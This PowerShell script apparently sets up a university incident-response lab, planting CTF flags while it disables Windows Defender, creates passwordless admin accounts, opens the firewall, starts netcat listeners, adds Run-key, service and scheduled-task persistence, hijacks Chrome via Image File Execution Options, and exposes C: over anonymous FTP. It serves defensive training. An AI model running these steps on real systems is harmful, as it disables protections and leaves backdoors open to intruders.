$BadAdminsFlag = "ACDLAB6{Never_should_have_come_here}"
$BadAdminName1 = "Spongebob"
$BadAdminName2 = "Patrick"
$BadAdminName3 = "Mr. Krabs"
$BadAdminName4 = "Sandy"
$BadAdminName5 = "Plankton"

$FirewallFlag = "ACDLAB6{They_took_down_our_shields!}"
$SSHFlag = "ACDLAB6{I_think_this_is_the_wrong_OS}"
$CurrentVersionRunFlag = "ACDLAB6{Who_said_you_could_run_on_boot?}"
$NetcatFlag = "ACDLAB6{Nyancat_bootloader_time!}"
$InstalledServiceFlag = "ACDLAB6{Definitely_a_legit_service}"
$TaskSchedulerFlag = "ACDLAB6{Wanna_see_me_run_it_again?}"
$KillFTPIISFlag = "ACDLAB6{Red_team_turned_off_my_services!}"
#$DisableDefenderFlag = "ACDLAB6{Hey_shouldn't_this_thing_be_on?}"
#$ImageFileExecutionOptionsFlag = "ACDLAB6{No_chrome_for_you_:)}"
$MapIISToCFlag = "ACDLAB6{Maybe_don't_have_C_publicly_avaialble}"

function DisableDefender {
    New-Item -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\" -Name "Windows Defender" -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Spynet" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft"-Name "MRT" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Signature Updates" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0 -Type DWORD -Force -ErrorAction Continue

    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Real-Time Protection" -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWORD -Force -ErrorAction Continue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWORD -Force -ErrorAction Continue

    Add-MpPreference -ExclusionPath "C:\ACDLAB6{Do_you_really_need_AV?}" -ErrorAction Continue
}

function MakeAdmins {
    New-LocalUser -Name $BadAdminName1 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName2 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName3 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName4 -Description $BadAdminsFlag -NoPassword
    New-LocalUser -Name $BadAdminName5 -Description $BadAdminsFlag -NoPassword
    Add-LocalGroupMember -Group "Administrators" -Member $BadAdminName1, $BadAdminName2, $BadAdminName3, $BadAdminName4, $BadAdminName5
}

function ImageFileExecutionOptions {
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -Name "chrome.exe" -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Debugger" -Value "C:\chrome.exe" -Type String -Force -ErrorAction Continue
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Flag" -Value "ACDLAB6{No_chrome_for_you_:)}" -Type String -Force -ErrorAction Continue
}

function DisableFirewall {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    New-NetFirewallRule -Name "Open Inbound TCP Ports >=)" -DisplayName "Open Inbound TCP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol TCP
    New-NetFirewallRule -Name "Open Inbound UDP Ports >=)" -DisplayName "Open Inbound UDP Ports" -Description $FirewallFlag -Enabled 1 -Direction Inbound -Action Allow -LocalPort 1-12345 -Protocol UDP
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 
}

function InstallSSH {
    # this needs to be tested, might be easier to get the openssh binary and install server and client from that 

    [System.Environment]::SetEnvironmentVariable('Path','C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;C:\Windows\System32\OpenSSH-Win64;')
    # C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
    Start-Service sshd
    Set-Service sshd -StartupType Automatic
    New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH" -Enabled 1 -Direction Inbound -Action Allow -LocalPort 22 -Protocol TCP -erroraction SilentlyContinue

    # drop a text file in the ssh install dir, need to double check location
    New-Item 'C:\Windows\System32\OpenSSH\flag.txt'
    Set-Content 'C:\Windows\System32\OpenSSH\flag.txt' $SSHFlag
}

function NetcatListeners {
    # probably replace exe name with flag or something, not sure yet
    # can also put the flag in a text file next to the exe
    # put nc in C:\Windows\nc
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1337}
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1338}
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1339}
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1340}
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1341}
    Start-Job -ScriptBlock{C:\Windows\nc\nc.exe -l -p 1342}
    New-Item 'C:\Windows\nc\flag.txt'
    Set-Content 'C:\Windows\nc\flag.txt' $NetcatFlag
}

function CurrentVersionRun {
    # Need new names for exes, probably put flags in values next to these
    # maybe create dummy exes that just pop msg box
    # can put flag in strings of file? will need to make sure to cover strings in IR lecture in some capacity
    # need to make C:\Windows\System32\CoolPrograms folder
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name NotMalware -Value %SystemRoot%\system32\CoolPrograms\not_malware.exe -PropertyType ExpandString -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name SuperSafeTotallyLegitProgram -Value %SystemRoot%\system32\CoolPrograms\SuperSafeTotallyLegitProgram.exe -PropertyType ExpandString -Force
    New-Item 'C:\Windows\System32\CoolPrograms\flag.txt'
    Set-Content 'C:\Windows\System32\CoolPrograms\flag.txt' $CurrentVersionRunFlag
    # I could also just grab the binaries from last year, put them in a folder and put a flag in there
}

function InstallService {
# https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-7.2

    New-Service -Name "LegitService" -BinaryPathName 'C:\WINDOWS\System32\svchost.exe -k netsvcs' -DisplayName "Legit Service" -StartupType "Automatic" -Description $InstalledServiceFlag

}

function TaskScheduler {
    $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive"
    $description = $TaskSchedulerFlag
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet
    $task = New-ScheduledTask -Action $action -Description $description -Principal $principal -Trigger $trigger -Settings $settings
    Register-ScheduledTask LegitTask -InputObject $task
}

function KillFTPIIS {
    Stop-Service W3SVC
    Stop-Service ftpsvc
    # also need to see if I can modify descrition of service
    # https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
    Set-Service -Name W3SVC -Description $KillFTPIISFlag
    Set-Service -Name ftpsvc -Description $KillFTPIISFlag
}

function MapIISToC {
    mkdir "C:\ACDLAB6{Maybe_don't_have_C_publicly_avaialble}"
    cmd.exe /C "%windir%\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/handlers"
    $sitenames = Get-IISSite | Where-Object Bindings -Match ".*ftp.*" | Select-Object -ExpandProperty Name
    foreach ($site in $sitenames) {
        Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter "system.applicationHost/sites/site[@name='$site']/ftpServer/security/authentication/anonymousAuthentication" -name "enabled" -value "True"
        Set-ItemProperty "IIS:\Sites\$site" -Name physicalPath -Value "C:\ACDLAB6{Maybe_don't_have_C_publicly_avaialble}"
    }
}

function BeginMsgBox {
    Add-Type -AssemblyName PresentationFramework
    $msgBoxInput = [System.Windows.MessageBox]::Show('WARNING: This script is for CMSC 491/691 Lab 6. DO NOT RUN THIS ON YOUR HOST MACHINE. It WILL damage your computer. ONLY run this script on your CMSC 491/691 Windows Server 2019 VM. Continue?','Hacking Application','YesNo','Error')
    switch ($msgBoxInput) {
      'Yes' {
        continue
      }
      'No' {
        exit
      }
    }
}

function EndMsgBox {
    Add-Type -AssemblyName PresentationFramework

    $msgBoxInput = [System.Windows.MessageBox]::Show('Hacking complete :)','Hacking Application','YesNoCancel','Error')
    switch ($msgBoxInput) {
      'Yes' {
        [System.Windows.MessageBox]::Show('Thank you for working with me')
      }
      'No' {
        [System.Windows.MessageBox]::Show('That did not seem to work…')
      }
      'Cancel' {
        [System.Windows.MessageBox]::Show('Cannot cancel a job that has already completed')
      }
    }    
}

function Write-ZipUsing7Zip([string]$FilesToZip, [string]$ZipOutputFilePath, [string]$Password, [ValidateSet('7z','zip','gzip','bzip2','tar','iso','udf')][string]$CompressionType = 'zip', [switch]$HideWindow)
{
    # Look for the 7zip executable.
    $pathTo32Bit7Zip = "C:\Program Files (x86)\7-Zip\7z.exe"
    $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
    $THIS_SCRIPTS_DIRECTORY = Split-Path $script:MyInvocation.MyCommand.Path
    $pathToStandAloneExe = Join-Path $THIS_SCRIPTS_DIRECTORY "7za.exe"
    if (Test-Path $pathTo64Bit7Zip) { $pathTo7ZipExe = $pathTo64Bit7Zip }
    elseif (Test-Path $pathTo32Bit7Zip) { $pathTo7ZipExe = $pathTo32Bit7Zip }
    elseif (Test-Path $pathToStandAloneExe) { $pathTo7ZipExe = $pathToStandAloneExe }
    else { throw "Could not find the 7-zip executable." }

    # Delete the destination zip file if it already exists (i.e. overwrite it).
    if (Test-Path $ZipOutputFilePath) { Remove-Item $ZipOutputFilePath -Force }

    $windowStyle = "Normal"
    if ($HideWindow) { $windowStyle = "Hidden" } # just do this?

    # Create the arguments to use to zip up the files.
    # Command-line argument syntax can be found at: http://www.dotnetperls.com/7-zip-examples
    $arguments = "a -t$CompressionType ""$ZipOutputFilePath"" ""$FilesToZip"" -mx9"
    if (!([string]::IsNullOrEmpty($Password))) { $arguments += " -p$Password" }

    # Zip up the files.
    $p = Start-Process $pathTo7ZipExe -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

    # If the files were not zipped successfully.
    if (!(($p.HasExited -eq $true) -and ($p.ExitCode -eq 0)))
    {
        throw "There was a problem creating the zip file '$ZipFilePath'."
    }
}

function Main {

    Set-ExecutionPolicy Bypass

    DisableDefender
    MakeAdmins
    ImageFileExecutionOptions
    DisableFirewall
    InstallSSH
    NetcatListeners
    InstallService
    TaskScheduler
    CurrentVersionRun
    KillFTPIIS
    MapIISToC

}

BeginMsgBox

Main 2>&1 | Tee-Object -FilePath C:\Windows\Fonts\results.txt

Write-ZipUsing7Zip -FilesToZip "C:\Windows\Fonts\results.txt" -ZipOutputFilePath "C:\Windows\Fonts\results.zip" -Password "NotSqordfish:)"

Remove-Item -Path "C:\Windows\Fonts\results.txt" -Force

EndMsgBox